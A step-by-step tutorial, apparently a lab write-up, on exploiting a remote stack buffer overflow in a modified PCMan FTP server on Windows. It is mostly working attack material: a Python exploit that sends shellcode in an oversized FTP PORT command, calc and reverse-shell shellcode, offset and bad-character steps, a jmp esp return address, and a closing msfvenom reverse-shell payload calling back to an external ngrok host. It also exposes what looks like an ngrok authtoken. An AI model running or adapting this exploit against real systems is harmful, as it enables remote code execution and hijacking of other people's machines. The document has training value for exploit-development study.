# Remote Stack buffer overflow - Windows Exploiting
## Part II - Overflow
---
## Step by step guide
### Sofware:

- Immunity debugger
- mona
- Vulnerble App PCMAN (modified by Master Dreg)
- Notepad ++
- VMVirtualbox
- ngrok
- netcat
- Wireshark


### OS:
- Kali linux
- Windows 10 pro
---

First, we set the ngrok configuration on our windows machine. To start the service we type:

```sh
C:\Users\code>ipconfig
Configuración IP de Windows

Adaptador de Ethernet Ethernet:

   Sufijo DNS específico para la conexión. . :
   Vínculo: dirección IPv6 local. . . : fe80::c9a3:af46:cf18:1cef%6
   Dirección IPv4. . . . . . . . . . . . . . : 10.0.2.15
   Máscara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : 10.0.2.2
```

```sh
ngrok tcp 21
ngrok authtoken 1nBcskXsfoW2Wjk5ko3F5WdnHGU_3UvZCBKiqekRjKrPByDys

ngrok by @inconshreveable                                                                               (Ctrl+C to quit)                                                                                                                        Session Status                online                                                                                    Account                       tester (Plan: Free)                                                                       Version                       2.3.35                                                                                    Region                        United States (us)                                                                        Web Interface                 http://127.0.0.1:4040                                                                     Forwarding                    tcp://4.tcp.ngrok.io:18453 -> localhost:21                                                                                                                                                                        Connections                   ttl     opn     rt1     rt5     p50     p90                                                                             1       0       0.00    0.00    5.09    5.09     
```

```sh
ping 4.tcp.ngrok.io
```
Open PCman.exe immunity debbuger and run it with F9

Copy target ip and port number, in our case ip is 3.131.147.49 and port number is 18453, paste on python base script and run it!

```python
#!/usr/bin/env python

from socket import *
from time import sleep
from sys import exit, exc_info
import os

print ("-") *40
print ("|    PCman Exploit v1.0 by Sm@rtR3v0lt |")
print ("-") *40
print ("|               thanks to Master Dreg! |")
print ("-") *40

os.system("sudo sh -c \"echo 0 > /proc/sys/net/ipv4/tcp_window_scaling\"")

target_ip = "3.131.147.49"
port = 18453 #int(21)

# https://github.com/David-Reguera-Garcia-Dreg/dregshells/blob/main/reverse_asm.asm
shellcode_rev = b"\x9C\x60\x31\xDB\x64\x8B\x7B\x30\x8B\x7F\x0C\x8B\x7F\x1C\x8B\x47\x08\x8B\x77\x20\x8B\x3F\x80\x7E\x0C\x33\x75\xF2\x89\xC7\x03\x78\x3C\x8B\x57\x78\x01\xC2\x8B\x7A\x20\x01\xC7\x89\xDD\x8B\x34\xAF\x01\xC6\x45\x81\x3E\x47\x65\x74\x50\x75\xF2\x81\x7E\x08\x64\x64\x72\x65\x75\xE9\x8B\x7A\x24\x01\xC7\x66\x8B\x2C\x6F\x8B\x7A\x1C\x01\xC7\x8B\x7C\xAF\xFC\x01\xC7\x6A\x69\x80\x34\x24\x69\x68\x61\x72\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x50\x96\xFF\xD7\x83\xC4\x10\x56\x57\x50\x68\x65\x73\x73\x69\x80\x74\x24\x03\x69\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\x56\xFF\xD7\x83\xC4\x0C\x50\x8B\x44\x24\x04\x68\x6C\x6C\x69\x69\x66\x81\x74\x24\x02\x69\x69\x68\x33\x32\x2E\x64\x68\x77\x73\x32\x5F\x54\xFF\xD0\x83\xC4\x0C\x50\x8B\x7C\x24\x0C\x68\x75\x70\x69\x69\x66\x81\x74\x24\x02\x69\x69\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50\xFF\xD7\x83\xC4\x0C\x31\xD2\x66\xBA\x90\x01\x29\xD4\x54\x52\xFF\xD0\x31\xD2\x66\xBA\x90\x01\x01\xD4\x8B\x04\x24\x8B\x7C\x24\x0C\x68\x74\x41\x69\x69\x66\x81\x74\x24\x02\x69\x69\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x50\xFF\xD7\x83\xC4\x0C\x31\xDB\x53\x53\x53\x31\xD2\xB2\x06\x52\x43\x53\x43\x53\xFF\xD0\x89\xC6\x8B\x04\x24\x8B\x7C\x24\x0C\x68\x65\x63\x74\x69\x83\x74\x24\x03\x69\x68\x63\x6F\x6E\x6E\x54\x50\xFF\xD7\x83\xC4\x08\x31\xC9\x68\xCC\x3C\xD2\x77\x83\x34\x24\xFF\x66\x68\xEE\xA3\x66\xF7\x14\x24\x31\xDB\x80\xC3\x02\x66\x53\x89\xE2\x6A\x10\x52\x56\x97\xFF\xD7\x83\xC4\x08\x8B\x44\x24\x10\x8B\x7C\x24\x0C\x68\x73\x41\x69\x69\x66\x81\x74\x24\x02\x69\x69\x68\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50\xFF\xD7\x83\xC4\x10\x68\x63\x6D\x64\x69\x83\x74\x24\x03\x69\x89\xE2\x56\x56\x56\x31\xDB\x31\xC9\x80\xC1\x12\x53\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\xC6\x44\x24\x10\x44\x8D\x4C\x24\x10\x54\x51\x53\x53\x53\x43\x53\x4B\x53\x53\x52\x53\xFF\xD0\x83\xC4\x58\x83\xC4\x14\x61\x9D\xE9\x2F\xFE\xFF\xFF\xCC"

# Windows\x86 - Null-Free WinExec Calc.exe Shellcode (195 bytes)
# https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html
shellcode_calc = '\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0'

current_shellcode = shellcode_calc

shellcode = '\x41' * 2007
shellcode += "\x9F\x53\x10\x10" # ret
shellcode += '\x90' * 20
shellcode += current_shellcode


print("\nshellcode content (size " + str(len(shellcode))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode))
print("\n")

target = inet_aton(target_ip)
target = inet_ntoa(target)

try:
    socket = socket(AF_INET, SOCK_STREAM)
except:
    print "\nError creating the network socket\n\n%s\n" % exc_info()       
    exit(1)    

try:
    print "Connecting to %s %d" % (target, port)
    socket.connect((target, port))
except:
    print "\nError connecting to %s\n\n%s\n" % (target, exc_info())
    exit(1)
    
print("Connected!")
sleep(1)
print(socket.recv(1000))
sleep(1)
print("Logging as anonymous")
socket.send('USER anonymous\r\n')
sleep(1)
print(socket.recv(1024))
print("Empty password")
sleep(1)
socket.send('PASS\r\n')
sleep(1)
print(socket.recv(1024))
try:
    print "Sending evil packet to %s %d (length: %d bytes), please wait a few secs...." % (target, port, len(shellcode))
    socket.send('PORT' + shellcode + '\r\n')
    sleep(5)
except:
    print "\nError sending evil packet to %s\n\n%s\n" % (target, exc_info())
    exit(1)

sleep(4)

print("\n\nDone! :-)\n")

socket.close()

sleep(1)

```

Our beloved windows calculator appears on the screen! We are going to try to debug the vulnerable program now with immunity debbuger, then we will modify the python code to perform the exploit step by step.

---

## Reverse exploiting | Deconstructing the exploit! "pasito a pasito"

Open again PCman.exe in immuty debbuger and run the program with F9 

First steps with the python file Sending the 3000 \x41

```python

#!/usr/bin/env python

from socket import *
from time import sleep
from sys import exit, exc_info
import os

print ("-") *40
print ("|    PCman Exploit v1.0 by Sm@rtR3v0lt |")
print ("-") *40
print ("|               thanks to Master Dreg! |")
print ("-") *40

target_ip = "3.131.147.49" #target_ip = "127.0.0.1"  in local mode
port = int(18453) #port = int(21) in local mode


# Windows\x86 - Null-Free WinExec Calc.exe Shellcode (195 bytes)
# https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html
shellcode_calc = '\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0'

current_shellcode = shellcode_calc



shellcode = '\x41' * 3000 # padding



print("\nshellcode content (size " + str(len(shellcode))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode))
print("\n")

target = inet_aton(target_ip)
target = inet_ntoa(target)

try:
    socket = socket(AF_INET, SOCK_STREAM)
except:
    print "\nError creating the network socket\n\n%s\n" % exc_info()       
    exit(1)    

try:
    print "Connecting to %s %d" % (target, port)
    socket.connect((target, port))
except:
    print "\nError connecting to %s\n\n%s\n" % (target, exc_info())
    exit(1)
    
print("Connected!")
sleep(1)
print(socket.recv(1000))
sleep(1)
print("Logging as anonymous")
socket.send('USER anonymous\r\n')
sleep(1)
print(socket.recv(1024))
print("Empty password")
sleep(1)
socket.send('PASS\r\n')
sleep(1)
print(socket.recv(1024))
try:
    print "Sending evil packet to %s %d (length: %d bytes), please wait a few secs...." % (target, port, len(shellcode))
    socket.send(shellcode)
    sleep(4)
    socket.close()

except:
    print "\nError sending evil packet to %s\n\n%s\n" % (target, exc_info())
    exit(1)


print("\n\nDone! :-)\n")


sleep(1)

```

As we can see, the application has crashed due to a buffer overflow. Now set up the logs folders with mona and create a 3000 bytes pattern.

```sh
!mona config -set workingfolder c:\logs\%p
!mona pattern_create 3000
```
Copy ASCII pattern from ... C:\logs\PCManFTPD2 folder ("pattern.txt) to the python script and comment or remove this line #shellcode = '\x41' * 3000.

```python
shellcode = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9'
```
Now it's time to campare the results with mona.

```python
!mona pattern_offset EIP
```
Showing us this result

```sh
Log data, item 8
 Address=0BADF00D
 Message= - Pattern p0Cp (0x70433070) found in cyclic pattern at position 2011

```
Adjust the shell code size and add the B's to the return address, comment the line with the shell ASCII , uncomment the line #shellcode = '\x41' * 2007 and adjust the A's string to repeat the whole process again.

```python
shellcode = '\x41' * 2011
shellcode += "\x42\x42\x42\x42" # ret
#shellcode = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa...............'
```
Launch again the vulnerable app on immunity debugger (Ctrl+F2 and F9) and run the script!
If we check ESI register  we can see that everything is working fine!

```sh
EAX 00000000
ECX FFFFE000
EDX 00000000
EBX 00406740 PCManFTP.00406740
ESP 0019ECE0
EBP 022A1780
ESI 0019ECEC ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
EDI 00000004
EIP 42424242
C 0  ES 002B 32bit 0(FFFFFFFF)
P 1  CS 0023 32bit 0(FFFFFFFF)
A 0  SS 002B 32bit 0(FFFFFFFF)
Z 0  DS 002B 32bit 0(FFFFFFFF)
S 0  FS 0053 32bit 251000(FFF)
T 0  GS 002B 32bit 0(FFFFFFFF)
D 0
O 0  LastErr ERROR_INVALID_HANDLE (00000006)
EFL 00010206 (NO,NB,NE,A,NS,PE,GE,G)
ST0 empty g
ST1 empty g
ST2 empty g
ST3 empty g
ST4 empty g
ST5 empty g
ST6 empty g
ST7 empty g
               3 2 1 0      E S P U O Z D I
FST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1

``` 
same on hexdump

```sh
0019F4C0  41 41 41 41 41 41 41 42 42 42 42 00 0A 00 4A 00  AAAAAAABBBB...J.
```
Cafe break! let's add some nulls to the script.

```python
shellcode += '\x90' * 20
```
## Yes!!! it works!

```sh
EAX 00000000
ECX FFFFE000
EDX 00000000
EBX 00406740 PCManFTP.00406740
ESP 0019ECE0
EBP 02221780
ESI 0019ECEC
EDI 00000004
EIP 42424242
C 0  ES 002B 32bit 0(FFFFFFFF)
P 1  CS 0023 32bit 0(FFFFFFFF)
A 0  SS 002B 32bit 0(FFFFFFFF)
Z 0  DS 002B 32bit 0(FFFFFFFF)
S 0  FS 0053 32bit 3FA000(FFF)
T 0  GS 002B 32bit 0(FFFFFFFF)
D 0
O 0  LastErr ERROR_INVALID_HANDLE (00000006)
EFL 00010206 (NO,NB,NE,A,NS,PE,GE,G)
ST0 empty g
ST1 empty g
ST2 empty g
ST3 empty g
ST4 empty g
ST5 empty g
ST6 empty g
ST7 empty g
               3 2 1 0      E S P U O Z D I
FST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1

```
Now we have the BBBB on the return address and the nulls within our shell! 
Let's check where is starting our pattern
Go to >> Expresion >> esp
```sh
0019ECF0  0D 0A 00 41 41 41 41 41 41 41 41 41 41 41 41 41  ...AAAAAAAAAAAAA
```

It's time to find out where are the bad guys! Run this mona command to create a new byte array, copy it from byte array.text on logs folder and paste it to the script. And... run it! ...Again!

```python
!mona bytearray -cpb "\x00"
```
Run the complete procces and compare the results with, but first chech the address with jmp expresion ESP (we can see our pattern)

```python
!mona compare -f C:\logs\PCManFTPD2\bytearray.bin -a 0019ECF0

```
```sh
mona Memory comparison results, item 0
 Address=0x0019ecf0
 Status=Corruption after 9 bytes
 BadChars=00 0a
 Type=normal
 Location=Stack
```
Remove the badchars, in windows x0d also when x0a appears in our badchars table (intro and return)
```python
!mona bytearray -cpb "\x00\x0a\x0d"
```
remove the badchars from the pattern in the python script and repeat the process again...
```python
#badchars "\x00\x0a\x0d"

shellcode = '\x41' * 2011 # padding
shellcode += '\x42\x42\x42\x42'
shellcode += '\x90' * 20

shellcode += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
shellcode += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
shellcode += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
shellcode += "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
shellcode += "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
shellcode += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
shellcode += "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
shellcode += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

```sh
Log data, item 4
 Address=0019ECF0
 Message=[+] Comparing with memory at location : 0x0019ecf0 (Stack)
Log data, item 3
 Address=0019ECF0
 Message=!!! Hooray, normal shellcode unmodified !!!

```
Time to generate now our shell code without the bad chars but frist we need to know our return address, just tipe

```python
0BADF00D   [+] Writing results to c:\logs\PCManFTPD2\jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 2
0BADF00D       - Number of pointers of type 'push esp # ret ' : 3
0BADF00D       - Number of pointers of type 'push esp # ret 0x0c' : 1
0BADF00D   [+] Results :
1010539F     0x1010539f : jmp esp |  {PAGE_EXECUTE_READWRITE} [dreg.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Users\code\Desktop\Remote Exploiting\pcman_dregmod\pcman_dregmod\dreg.dll)
0043410D     0x0043410d : jmp esp | startnull,ascii {PAGE_EXECUTE_READ} [PCManFTPD2.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.0.0 (C:\Users\code\Desktop\Remote Exploiting\pcman_dregmod\pcman_dregmod\PCManFTPD2.exe)
00408A88     0x00408a88 : push esp # ret  | startnull {PAGE_EXECUTE_READ} [PCManFTPD2.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.0.0 (C:\Users\code\Desktop\Remote Exploiting\pcman_dregmod\pcman_dregmod\PCManFTPD2.exe)
0040E85F     0x0040e85f : push esp # ret  | startnull {PAGE_EXECUTE_READ} [PCManFTPD2.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.0.0 (C:\Users\code\Desktop\Remote Exploiting\pcman_dregmod\pcman_dregmod\PCManFTPD2.exe)
0040E93B     0x0040e93b : push esp # ret  | startnull {PAGE_EXECUTE_READ} [PCManFTPD2.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.0.0 (C:\Users\code\Desktop\Remote Exploiting\pcman_dregmod\pcman_dregmod\PCManFTPD2.exe)
004252E7     0x004252e7 : push esp # ret 0x0c | startnull {PAGE_EXECUTE_READ} [PCManFTPD2.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.0.0 (C:\Users\code\Desktop\Remote Exploiting\pcman_dregmod\pcman_dregmod\PCManFTPD2.exe)
0BADF00D       Found a total of 6 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:04.189000
```
1010539F is our return address
---
## Working with kali
In order to stablish the remote conection run ngrok with a valid authtoken 
´´´sh
ngrok by @inconshreveable                                                                                                        (Ctrl+C to quit)
                                                                                                                                                 
Session Status                online                                                                                                             
Account                       ppepepep (Plan: Free)                                                                                              
Version                       2.3.35                                                                                                             
Region                        United States (us)                                                                                                 
Web Interface                 http://127.0.0.1:4040                                                                                              
Forwarding                    tcp://2.tcp.ngrok.io:15893 -> localhost:2021                                                                       
                                                                                                                                                 
Connections                   ttl     opn     rt1     rt5     p50     p90                                                                        
                              0       0       0.00    0.00    0.00    0.00
```
ping the ngrok address to find out the ip

Let´s go and create a payload with msvenom, open a terminal and type:
```sh
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=3.14.182.203 LPORT=15893  -f python

buf += b"\x89\xe7\xda\xd5\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x49\x78\x6c"
buf += b"\x42\x33\x30\x57\x70\x65\x50\x31\x70\x6f\x79\x6d\x35"
buf += b"\x76\x51\x4b\x70\x61\x74\x4e\x6b\x62\x70\x50\x30\x4c"
buf += b"\x4b\x50\x52\x76\x6c\x6c\x4b\x33\x62\x57\x64\x4c\x4b"
buf += b"\x53\x42\x31\x38\x56\x6f\x68\x37\x72\x6a\x51\x36\x30"
buf += b"\x31\x69\x6f\x6c\x6c\x65\x6c\x63\x51\x71\x6c\x37\x72"
buf += b"\x54\x6c\x61\x30\x79\x51\x38\x4f\x34\x4d\x76\x61\x49"
buf += b"\x57\x4a\x42\x49\x62\x43\x62\x56\x37\x6c\x4b\x30\x52"
buf += b"\x62\x30\x4c\x4b\x42\x6a\x37\x4c\x4e\x6b\x72\x6c\x47"
buf += b"\x61\x63\x48\x6b\x53\x47\x38\x77\x71\x38\x51\x76\x31"
buf += b"\x4e\x6b\x50\x59\x35\x70\x35\x51\x38\x53\x6c\x4b\x43"
buf += b"\x79\x66\x78\x4b\x53\x67\x4a\x31\x59\x4e\x6b\x67\x44"
